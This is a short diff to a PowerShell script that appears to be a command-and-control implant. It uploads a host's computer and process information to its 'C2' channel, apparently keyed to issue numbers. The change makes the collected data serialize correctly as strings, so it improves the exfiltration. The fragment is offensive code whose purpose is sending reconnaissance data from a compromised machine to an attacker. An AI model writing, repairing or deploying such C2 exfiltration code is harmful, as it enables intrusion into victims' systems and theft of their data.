@@ -271,7 +271,7 @@ catch
 #Upload the computer info
 try
 {
-    Send-PackageMessage -Package "COMPINFO" -IssueNumber $issueNumber -Body ($compInfo)
+    Send-PackageMessage -Package "COMPINFO" -IssueNumber $issueNumber -Body ($compInfo | Out-String)
     Write-Console -Body "Uploaded the computer info to C2." -IssueNumber $issueNumber
 	Write-Host "DEBUG: Uploaded the computer info to C2."
 }
@@ -286,7 +286,7 @@ catch
 #Upload the process info
 try
 {
-    Send-PackageMessage -Package "PROCINFO" -IssueNumber $issueNumber -Body ($procInfo)
+    Send-PackageMessage -Package "PROCINFO" -IssueNumber $issueNumber -Body ($procInfo | Out-String)
     Write-Console -Body "Uploaded the process info to C2." -IssueNumber $issueNumber
 	Write-Host "DEBUG: Uploaded the process info to C2."
 }
